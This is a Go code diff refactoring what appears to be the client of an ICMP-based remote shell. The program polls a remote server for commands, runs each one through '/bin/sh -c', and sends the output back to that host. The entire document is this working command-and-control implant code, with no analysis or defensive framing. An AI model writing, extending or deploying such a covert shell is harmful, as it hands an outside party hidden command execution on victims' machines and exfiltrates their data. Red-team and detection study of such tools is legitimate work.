@@ -10,11 +10,20 @@ import (
 )
 
 const retrySeconds = 5
+const messageTypeCommandRequest = 0x01
+const messageTypeCommandOutput = 0x02
 
 func pollForCommands(s net.Addr) {
 	for {
-		cmdP := transport.Send(s, []byte(""), transport.IcmpCodeCommandRequest)
-		if cmdP.Message.Code == transport.IcmpCodeCommandReply {
+		cmdP := transport.Send(s, &transport.Payload{
+			Type: messageTypeCommandRequest,
+			Data: []byte{},
+		})
+		if cmdP == nil {
+			continue
+		}
+
+		if cmdP.Payload.Type == messageTypeCommandRequest {
 			go runCommandAndReport(cmdP)
 		}
 
@@ -23,7 +32,7 @@ func pollForCommands(s net.Addr) {
 }
 
 func runCommandAndReport(cmdP *transport.Packet) {
-	cmd := string(cmdP.Body.Data)
+	cmd := string(cmdP.Payload.Data)
 
 	log.Println("Running command", cmd)
 	c := exec.Command("/bin/sh", "-c", cmd)
@@ -33,7 +42,10 @@ func runCommandAndReport(cmdP *transport.Packet) {
 	}
 
 	log.Println("Sending output", string(o))
-	go transport.Send(*cmdP.From, o, transport.IcmpCodeCommandOutput)
+	transport.Send(*cmdP.From, &transport.Payload{
+		Type: messageTypeCommandOutput,
+		Data: o,
+	})
 }
 
 func main() {
